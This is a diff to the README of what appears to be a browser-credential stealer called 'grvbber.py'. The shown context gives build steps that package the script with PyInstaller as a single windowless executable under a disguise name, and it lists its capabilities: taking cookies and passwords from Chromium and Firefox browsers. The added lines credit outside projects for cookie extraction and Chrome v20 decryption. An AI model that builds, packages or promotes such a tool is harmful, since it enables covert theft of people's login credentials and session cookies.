@@ -15,6 +15,9 @@ then type this in command prompt
 pip install pyinstaller
 pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py 
 ```
+
+credits to https://github.com/yanaksalvo/Browser-Data-Cookie-Extractor and https://github.com/runassu/chrome_v20_decryption for chromium v20 decryption
+
 <br>capabilities</br>
 - Gets cookies (chromium/firefox)
 - Gets passwords (chromium/firefox)
